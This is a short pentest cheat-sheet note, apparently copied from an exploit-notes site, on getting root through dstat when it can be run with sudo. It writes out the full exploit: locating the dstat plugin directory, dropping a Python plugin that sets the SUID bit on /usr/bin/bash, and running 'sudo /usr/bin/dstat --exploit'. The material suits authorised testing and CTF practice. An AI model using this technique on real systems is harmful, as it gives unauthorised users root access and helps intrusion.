## Dstat
#dstat #lpe
Taken from https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/

dstat is a versatile tool for generating system resource statistics.  
It allows users to create a custom plugin and execute by adding option e.g. **`dstat --myplugin`**.

First off, find locate "dstat" directory.

```sh
find / -type d -name dstat 2>/dev/null
```

Assume that the location of dstat is **“/usr/local/share/dstat”**.  
Create a plugin called **"dstat_exploit.py"** under **"/usr/local/share/dstat/"**.

```sh
import os

os.system('chmod +s /usr/bin/bash')
```

dstat recognizes plugins under **"/usr/local/share/dstat/"**.  
Check if the above exploit plugin has been added by executing the following command.

```sh
dstat --list | grep exploit
```

Now execute dstat with **“—exploit”** flag (the flag name is determined by the suffix of the file name e.g. **"dstat_<plugin-name>.py"**).

```sh
sudo /usr/bin/dstat --exploit
```